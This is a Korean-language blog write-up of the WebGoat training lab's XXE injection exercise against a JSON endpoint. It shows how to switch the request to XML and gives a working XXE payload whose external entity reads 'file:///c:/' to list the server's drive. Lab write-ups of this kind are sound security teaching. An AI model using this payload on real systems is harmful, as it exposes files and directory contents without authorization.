---
layout: post
title: WebGoat - XXE Injection (2)
date: 2021-01-13 20:00:00 +0900
category: Web_Hacking
---

# WebGoat - XXE Injection (2)

#### 최신 REST framework를 사용하는 서버의 경우, JSON 엔드포인트는 XXE 공격에 취약할 수 있다. 이전 문제와 같은 방식으로 XXE Injection을 시도하여 시스템의 root 디렉토리에 있는 파일들의 이름 나열하기

<br/>

> XXE(XML eXternal Entity) Injection이란 XML이 외부 엔티티를 포함하고 있을 때, 이를 이용하여 기밀 데이터 유출, DoS 등을 유발하는 공격이다.

<br/>

댓글을 작성한 후 Burp Suite를 통해 보면 Content-Type이 application/json인 것을 알 수 있고, 이를 통해 body 부분이 JSON 형식으로 전송된다는 것을 알 수 있다.

![webgoat_xxe2_1](/public/img/webgoat_xxe2_1.PNG)

![webgoat_xxe2_2](/public/img/webgoat_xxe2_2.PNG)

<br/>

이전과 같은 방식으로 문제를 풀라고 했으므로, Content-Type을 applicaion/xml로 수정하고 body 부분도 이전과 동일하게 수정하여 전송해보자. 

```shell
Content-Type: application/xml

<?xml version="1.0" standalone="yes" ?>
<!DOCTYPE comment [
  <!ELEMENT comment (#PCDATA)>
  <!ENTITY js SYSTEM "file:///c:/">
]>
<comment>
<text>&js;</text>
</comment>
```

![webgoat_xxe2_3](/public/img/webgoat_xxe2_3.PNG)

<br/>

그 결과, 현재 C드라이브에 존재하는 모든 디렉토리와 파일들이 보여진다.

![webgoat_xxe2_4](/public/img/webgoat_xxe2_4.PNG)

